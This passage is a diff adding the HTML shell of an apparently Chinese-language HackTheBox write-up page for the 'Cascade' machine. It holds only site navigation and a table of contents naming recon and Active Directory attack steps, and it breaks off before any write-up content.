@@ -1,0 +1,2225 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://Zer0-hex.github.io/write-up/HackTheBox/Machines/Cascade/">
+      
+      
+        <link rel="prev" href="../Bookworm%20/">
+      
+      
+        <link rel="next" href="../Clicker/">
+      
+      
+      <link rel="icon" href="https://0.gravatar.com/avatar/436e8b6da13e17a08ed80d048a0135ff4db9e3b5d0f243f7f090a92a1db0dc98?size=512">
+      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.6">
+    
+    
+      
+        <title>Cascade - Write-up</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.50c56a3b.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#cascade" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="Write-up" class="md-header__button md-logo" aria-label="Write-up" data-md-component="logo">
+      
+  <img src="https://0.gravatar.com/avatar/436e8b6da13e17a08ed80d048a0135ff4db9e3b5d0f243f7f090a92a1db0dc98?size=512" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Write-up
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Cascade
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Zer0-hex/Zer0-hex.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Zer0-hex/Zer0-hex.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+  HackTheBox
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Write-up" class="md-nav__button md-logo" aria-label="Write-up" data-md-component="logo">
+      
+  <img src="https://0.gravatar.com/avatar/436e8b6da13e17a08ed80d048a0135ff4db9e3b5d0f243f7f090a92a1db0dc98?size=512" alt="logo">
+
+    </a>
+    Write-up
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Zer0-hex/Zer0-hex.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Zer0-hex/Zer0-hex.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+      
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    HackTheBox
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            HackTheBox
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Index
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Challenges
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Challenges
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_1" id="__nav_2_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Crypto
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Crypto
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/Crypto/VeryEasy-BabyEncryption/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    [Protected] Very Easy - BabyEncryption
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/Crypto/Weak%20RSA/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    [Protected] Weak RSA
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_2" id="__nav_2_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Pwn
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Pwn
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/Pwn/You%20know%200xDiablos/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    [Protected] You know 0xDiablos
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_3" id="__nav_2_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Reversing
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Reversing
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/Reversing/Find%20The%20Easy%20Pass/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    [Protected] Find The Easy Pass
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_4" id="__nav_2_2_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Web
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Web
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/Web/Easy-ProxyAsAService/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    [Protected] Easy-ProxyAsAService
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Challenges/Web/Under%20Construction/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    [Protected] Under Construction
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Machines
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Machines
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Active/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Analysis/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Bizness/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    [Protected] Bizness
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Blackfield/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Blackfield
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Blue/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Blue
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Bookworm%20/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bookworm
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Cascade
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Cascade
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#recon-enum" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recon &amp; Enum
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Recon & Enum">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#msrpc" class="md-nav__link">
+    <span class="md-ellipsis">
+      MSRPC
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ldap" class="md-nav__link">
+    <span class="md-ellipsis">
+      LDAP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kerberos-sec" class="md-nav__link">
+    <span class="md-ellipsis">
+      kerberos-sec
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-user-rthompson" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as User - r.thompson
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Shell as User - r.thompson">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      密码喷射
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#as-reproasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      AS-REPRoasting
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kerberoasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      Kerberoasting
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bloodhound" class="md-nav__link">
+    <span class="md-ellipsis">
+      BloodHound
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-user-ssmith" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as User - s.smith
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Shell as User - s.smith">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bloodhound_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      BloodHound
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-user-arksvc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shell as User - ArkSvc
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Shell as User - ArkSvc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      逆向分析
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bloodhound_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      BloodHound
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Clicker/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Clicker
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Corporate%20/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Corporate
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Forest/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Forest
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Jerry/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    jerry
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Lame/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Lame
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Mantis/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Mantis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Monitored/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Monitored
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Netmon/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Netmon
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Pov/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pov
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Reel/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Reel
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Resolute/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Resolute
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Sau/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Sau
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Sauna/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Sauna
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Sizzle/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Sizzle
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Visual/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Visual
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%BE%85%E6%95%B4%E7%90%86-Appsanity/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Appsanity
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%BE%85%E6%95%B4%E7%90%86-Gofer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hard - Gofer
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%BE%85%E6%95%B4%E7%90%86-Manager/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Manager
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%BE%85%E6%95%B4%E7%90%86-Rebound/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Rebound
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Sherlocks
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Sherlocks
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Sherlocks/Logjammer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Logjammer
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Sherlocks/OpTinselTrace-1/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OpTinselTrace-1
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Sherlocks/OpTinselTrace-3/" class="md-nav__link">
+        
+  
